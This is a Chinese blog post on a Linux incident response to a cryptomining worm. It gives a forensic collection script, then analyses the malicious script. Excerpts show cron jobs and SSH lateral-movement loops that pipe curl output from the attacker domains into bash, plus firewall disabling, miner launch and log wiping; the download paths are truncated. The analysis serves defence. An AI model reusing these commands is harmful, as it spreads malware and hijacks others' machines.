> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/gmvlIJ8j-dJcAeVlR-_ytA)

背景
--

前一段时间我处理了一次应急响应，我还输出了一篇文章 Linux 应急响应笔记。这两天又处理了一次病毒入侵，在前一次的基础上，这次应急做了一些自动化脚本，应急响应效率有了一定程度的提升，故另做一份笔记。

PS：本文重在分享应急响应经验，文中保留了恶意网址，但是删除了恶意脚本及程序的下载路径。本文仅用于技术讨论与分析，严禁用于任何非法用途，违者后果自负。

应急操作笔记
------

查看我上一次 Linux 应急响应笔记，我发现罗列这么多命令，很多时候眼花缭乱，操作起来也不方便，不如写个 shell 脚本自动化收集信息。

### 自动化信息收集

我的自动化手机信息的脚本如下，脚本的初衷是进行自动化信息收集，不需要我去连接到客户设备，提升操作 / 沟通效率。

```
#!/bin/bash

function initial(){
    echo "Doing initial"
    mkdir /tmp/GatherInfo    
    chmod +x ./chkrootkit
    chmod +x ./busybox
}

function chkrootkit_info(){
    echo "Doing chkrootkit"
    ./chkrootkit > /tmp/GatherInfo/chkrootkit.log 2>&1
}

function network_info(){
    echo "Gathering network info"
    netstat -tulnp > /tmp/GatherInfo/netstat_tulnp.log 2>&1
    netstat -anp > /tmp/GatherInfo/netstat_anp.log 2>&1
}

function process_info(){
    echo "Gathering process info"
    ps aux > /tmp/GatherInfo/ps_aux.log 2>&1
    ps auxef > /tmp/GatherInfo/ps_auxef.log 2>&1
    top -n 1 > /tmp/GatherInfo/top_n1.log 2>&1
}

function init_info(){
    echo "Gathering init info"
    chkconfig --list > /tmp/GatherInfo/chkconfig_list.log 2>&1
    ls -alt /etc/init* > /tmp/GatherInfo/ls_alt_etc_init.log 2>&1
}

function cron_info(){
    echo "Gathering cron info"
    cat /etc/crontab > /tmp/GatherInfo/crontab.log 2>&1
    cat /etc/anacrontab > /tmp/GatherInfo/anacrontab.log 2>&1
    crontab -l > /tmp/GatherInfo/crontab_l.log 2>&1

    cd /etc/cron.d/
    cat * > /tmp/GatherInfo/etc_cron.d.log 2>&1
    cd /etc/cron.daily/
    cat * > /tmp/GatherInfo/etc_daily.log 2>&1
    cd /etc/cron.hourly/
    cat * > /tmp/GatherInfo/etc_hourly.log 2>&1
    cd /etc/cron.monthly/
    cat * > /tmp/GatherInfo/etc_monthly.log 2>&1
    cd /etc/cron.weekly/
    cat * > /tmp/GatherInfo/etc_weekly.log 2>&1
    cd /var/spool/cron/
    cat * > /tmp/GatherInfo/var_spool_cron.log 2>&1
    cd /var/spool/anacron/
    cat * > /tmp/GatherInfo/var_spool_anacron.log 2>&1
}

function other_info(){
    echo "Gathering other info"
    cat /etc/passwd | grep -v nologin > /tmp/GatherInfo/passwd.log 2>&1
    ls -alt /tmp > /tmp/GatherInfo/tmp.log 2>&1
    ls -alt /var/tmp > /tmp/GatherInfo/var_tmp.log 2>&1
    ls -alt /dev/shm > /tmp/GatherInfo/dev_shm.log 2>&1
    echo $LD_PRELOAD > /tmp/GatherInfo/LD_PRELOAD.log 2>&1
    cat /etc/ld.so.preload > /tmp/GatherInfo/etc_ld.so.preload.log 2>&1
    s -alt /root/.ssh > /tmp/GatherInfo/ls_alt_root_.ssh.log 2>&1
    cat /root/.ssh/* > /tmp/GatherInfo/cat_root_.ssh.log 2>&1

    for user in /home/*
    do
        if test -d $user;then
            cat /$user/.ssh/* > /tmp/GatherInfo/cat_$user_.ssh.log 2>&1
        fi
    done
}

initial
chkrootkit_info
network_info
process_info
init_info
cron_info
other_info

cd /tmp
tar -zcvf GatherInfo.tar.gz GatherInfo

```

### 信息收集结果分析

查看自动化收集的信息 GatherInfo 下的所有文件内容，根据下面的 Checklist 表项进行挨个梳理排查

应急响应检查表

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38C2UuNpeP9omVEfVibN92fWcCu2EUcdt2fObeFpkRmyeEorPeCb5q1wYWecjricyiaRAsO9S6pG1VGg/640?wx_fmt=jpeg)![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38C2UuNpeP9omVEfVibN92fWBLEXgcxf1EExqUjTkiblNNia7cexWnYKCwfseIOLUxChWgvGkeiarl0EQ/640?wx_fmt=jpeg)

在排查进程，网络时都未发现异常。在排查定时任务 crontab 时，发现三行异常的定时任务

```
59 * * * * root (curl -fsSL http://t.amynx.com/ ......
28 * * * * root (curl -fsSL http://t.jdjdcjq.top/ ......
13 * * * * root ps aux|grep lplp.ackng.com ......

```

我把恶意脚本获取到本地，这是一个 shell 脚本，接下来分析看看这个脚本干什么

### 恶意脚本分析

恶意脚本脚本共 439 行代码，前面 300 行都是删除文件和杀死进程，我简单摘要几段代码

```
#/bin/bash
processes(){
    killme() {
      killall -9 chron-34e2fg;ps wx|awk '/34e|r\/v3|moy5|defunct/' | awk '{print $1}' | xargs kill -9 & > /dev/null &
    }

    killa() {
    what=$1;ps auxw|awk "/$what/" |awk '!/awk/' | awk '{print $2}'|xargs kill -9&>/dev/null&
    }

    killa 34e2fg
    killme

    killall \.Historys
    killall \.sshd
    killall neptune
    killall xm64
    killall xm32
    killall xmrig
    killall \.xmrig
    killall suppoieup

    # sshd
    ps ax | grep sshd | grep -v grep | awk '{print $1}' > /tmp/ssdpid
    while read sshdpid
    do
        if [ $(echo  $(ps -p $sshdpid -o %cpu | grep -v \%CPU) | sed -e 's/\.[0-9]*//g')  -ge 60 ]
        then
            kill $sshdpid
        fi
    done < /tmp/ssdpid
    rm -f /tmp/ssdpid

# Removing miners by known path IOC
files(){
    ulimit -n 65535
    rm -rf /var/log/syslog
    chattr -iua /tmp/
    chattr -iua /var/tmp/
    chattr -R -i /var/spool/cron
    chattr -i /etc/crontab
    ufw disable
    iptables -F
    echo "nope" >/tmp/log_rot
    sudo sysctl kernel.nmi_watchdog=0
    echo '0' >/proc/sys/kernel/nmi_watchdog
    echo 'kernel.nmi_watchdog=0' >>/etc/sysctl.conf
    rm /tmp/.cron
    rm /tmp/.main
    rm /tmp/.yam* -rf
    rm -f /tmp/irq

# Killing and blocking miners by network related IOC
network(){
    # Kill by known ports/IPs
    netstat -anp | grep 69.28.55.86:443 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
    netstat -anp | grep 185.71.65.238 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9

files
processes
network
echo "DONE"

```

接下来是下载恶意二进制程序以及 ssh 横向传播

```
代码片段1
if [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then
  for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h 'export src=sshcopy;(curl -fsSL http://t.amynx.com/ ......
fi

代码片段2
for file in /home/*
do
    if test -d $file; then
        if [ -f $file/.ssh/known_hosts ] && [ -f $file/.ssh/id_rsa.pub ]; then
            for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" $file/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h 'export src=sshcopy;(curl -fsSL http://t.amynx.com/ ...... |bash >/dev/null 2>&1 &' & done
        fi
    fi
done

代码片段3
  for user in $userlist; do
    for host in $hostlist; do
      for key in $keylist; do
        for sshp in $sshports; do
          i=$((i+1))
          if [ "${i}" -eq "20" ]; then
            sleep 20
            ps wx | grep "ssh -o" | awk '{print $1}' | xargs kill -9 &>/dev/null &
            i=0
          fi
          #Wait 20 seconds after every 20 attempts and clean up hanging processes

          chmod +r $key
          chmod 400 $key
          echo "$user@$host $key $sshp"
          ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=5 -i $key $user@$host -p$sshp "export src=sshcopy;(curl -fsSL http://t.amynx.com/ ...... |bash >/dev/null 2>&1 &"
        done
      done
    done
  done

```

上面这三段代码是通过 ssh 的证书登录方式横向感染传播。

```
if [ ! -d "/.Xll" ];then
    mkdir /.Xll
fi
cd /.Xll
if [ ! -f "./xr" ];then
    uname -a|grep x86_64 && (curl -fsSL d.ackng.com/ ......
fi
uname -a|grep x86_64 && ps aux|grep lplp.ackng.com |grep -v grep || ./xr -o lplp.ackng.com:444 --opencl --donate-level=1 --nicehash -B --http-host=0.0.0.0 --http-port=65529

```

上面这段代码是下载恶意二进制程序，应该就是挖矿病毒本体。

最后是清理痕迹

```
history -c
echo 0>/var/spool/mail/root
echo 0>/var/log/wtmp
echo 0>/var/log/secure
echo 0>/var/log/cron
echo > /root/.bash_history

```

### 清理与恢复

根据恶意脚本的逻辑，整理出清理步骤如下 1 删除 crontab 恶意定时任务 2 杀死./xr 进程 3 删除 /.Xll 目录

总结与反思
-----

### 病毒标识

> 目录及文件 /.Xll 和 /.Xll/xr
> 
> 进程表示 ps aux | grep lplp.ackng.com
> 
> 两个域 t.amynx.com， t.jdjdcjq.top

### 挖矿威胁小于勒索

每次碰到病毒入侵要应急都心惊胆颤，挖矿病毒都还好，最坏情况是重装个环境，客户的数据是安全的，如果是勒索病毒就会很棘手。

无论如何，还是尽量保证系统安全性，减小系统入侵攻击面，这样可以极大保护系统不被入侵。

### 防护建议

一般来说，自动化的入侵一般都是利用非常简单的漏洞，比如若口令，使用存在漏洞的组件，未授权访问等，另外一个感染病毒的方式是 ssh 证书认证。如上文提到的，针对 ssh 横向传播就有三个方式，看来这种方式还是很受青睐的。所以对于厂商来说，还是要适当的控制 ssh 证书登入。

最后，我把上述用到的脚本和 checklist 放在 https://github.com/kafroc/emergency-response-toolbox 中，有需要的读者可下载使用，欢迎任何的反馈意见。  

![](https://mmbiz.qpic.cn/mmbiz_gif/qq5rfBadR38Tm7G07JF6t0KtSAuSbyWtgFA8ywcatrPPlURJ9sDvFMNwRT0vpKpQ14qrYwN2eibp43uDENdXxgg/640?wx_fmt=gif)

![](http://mmbiz.qpic.cn/mmbiz_png/3Uce810Z1ibJ71wq8iaokyw684qmZXrhOEkB72dq4AGTwHmHQHAcuZ7DLBvSlxGyEC1U21UMgSKOxDGicUBM7icWHQ/640?wx_fmt=png&wxfrom=200) 交易担保 FreeBuf+ FreeBuf + 小程序：把安全装进口袋 小程序

精彩推荐

  

  

  

  

****![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ib2xibAss1xbykgjtgKvut2LUribibnyiaBpicTkS10Asn4m4HgpknoH9icgqE0b0TVSGfGzs0q8sJfWiaFg/640?wx_fmt=jpeg)****

[![](https://mmbiz.qpic.cn/mmbiz_png/qq5rfBadR3icpSmNbdiaVpmTEfDHJFoS2OIO0ibau3Xo0W3W5icSIT9hIQY4gmlK4nOY8jcVq2hngIe7Fug8w6lHyQ/640?wx_fmt=png)](https://mp.weixin.qq.com/s?__biz=Mzg2MTAwNzg1Ng==&mid=2247484287&idx=1&sn=16a9b2dc0e205a0e5fe86ae5cae9fe2e&scene=21#wechat_redirect)[![](https://mmbiz.qpic.cn/mmbiz_png/qq5rfBadR39823fgk2Py1fbU5wCoewwO0AKFIGmCLF6bY37GDicGMDRicgQf6xW1jtjY8Raby8RjiauX5205Zg8Dg/640?wx_fmt=png)](https://mp.weixin.qq.com/s?__biz=Mzg2MTAwNzg1Ng==&mid=2247484370&idx=1&sn=8b79701a2936e04e390f165344e5fcdc&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_png/qq5rfBadR38jJpuKrr8kx7KiazujuhoibR00ibHanwiaWL3iacIL65dliaJaPRwUwL2DvOo9NL4UWva3EwF35bcflS0A/640?wx_fmt=png)](https://mp.weixin.qq.com/s?__biz=Mzg2MTAwNzg1Ng==&mid=2247485242&idx=1&sn=b189e16baeec14f28f55c690598ef020&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_png/qq5rfBadR3ibiaZJLCsVMlaEsibPjqzeh60YWkj7icVX18lFGJjXJia40sq6PzwUJ8urTCswbZdc4g7KnKklEcsJKdw/640?wx_fmt=png)](https://mp.weixin.qq.com/s?__biz=Mzg2MTAwNzg1Ng==&mid=2247485180&idx=1&sn=06c034789bc8656821df64075e3d9372&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_png/qq5rfBadR38ibJ9pkJia3Q6VHGxykVprRoZlaPuPLW8XKKK9XdK8RVljA2pBue8QhRyTx8HQoVEC5Kre2H3Y44vQ/640?wx_fmt=png)](https://mp.weixin.qq.com/s?__biz=Mzg2MTAwNzg1Ng==&mid=2247485114&idx=1&sn=0c765c3970ddfd1021b59c6adaea52ce&scene=21#wechat_redirect)

**************![](https://mmbiz.qpic.cn/mmbiz_gif/qq5rfBadR3icF8RMnJbsqatMibR6OicVrUDaz0fyxNtBDpPlLfibJZILzHQcwaKkb4ia57xAShIJfQ54HjOG1oPXBew/640?wx_fmt=gif)**************